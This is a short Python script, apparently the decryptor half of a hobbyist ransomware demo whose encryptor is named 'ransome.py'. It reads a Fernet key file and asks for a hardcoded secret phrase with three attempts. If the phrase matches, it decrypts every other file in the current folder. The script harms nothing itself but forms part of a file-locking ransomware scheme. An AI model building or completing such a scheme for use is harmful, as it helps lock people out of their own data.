import os
from cryptography.fernet import Fernet

files=[]
# Open all files in the current folder except this
for file in os.listdir():
    if file == "ransome.py" or file == "thekey.key" or file =="desktop.ini" or file=="decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)

#print(files)

with open("thekey.key" ,"rb") as thekey:
    key=thekey.read()

def decrypt_logic():
    for file in files:
        with open(file,"rb") as thefile:
            contents=thefile.read()
        content_decrypted=Fernet(key).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(content_decrypted)
            
print("Rember you have only 3 attempts\n")
i=3
while(i>0):
    secrete_message = input("Enter secret message to decrypt your files!\n")
    if(secrete_message == "KhulJaaSimSim"):
        decrypt_logic()
        print("Congrats!!! Enjoy")
        break
    else:
        print(f"Attempts Left: {i-1}")
    i-=1
    

    
